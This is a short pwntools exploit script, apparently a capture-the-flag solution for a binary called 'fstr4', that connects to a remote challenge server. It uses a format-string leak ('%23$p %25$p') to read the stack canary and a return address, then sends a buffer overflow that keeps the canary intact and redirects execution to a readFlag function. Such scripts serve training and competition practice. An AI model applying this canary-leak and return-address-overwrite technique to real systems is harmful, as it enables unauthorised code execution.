#nc 13.214.30.13 10004
from pwn import *
context.binary = binary = './fstr4'

vuln = ELF(binary)
vuln_rop = ROP(vuln)



readFlag = 0x0000000000401216
payload = b'a'*72

# print(vuln_rop.find_gadget(['pop rdi', 'ret']))
offset = vuln.symbols.main - vuln.symbols.readFlag

p = remote("13.214.30.13", 10005)
p.recvline()
p.recvline()
p.sendline(b'%23$p %25$p')
addr = p.recvline().split()
canary = addr[1]
main = addr[2]
# print(canary, main)
# # log.info(f"hex: {canary}, main: {main}")
temp = (int(main, 16) - vuln.symbols.main + vuln.symbols.readFlag - 50)
# # canary = u64(canary.strip().ljust(8, b'\x00'))
payload = payload + p64(int(canary, 16)) + b'a'*8 + p64(temp)

p.recvline()
p.sendline(payload)
p.recvline()
p.interactive()


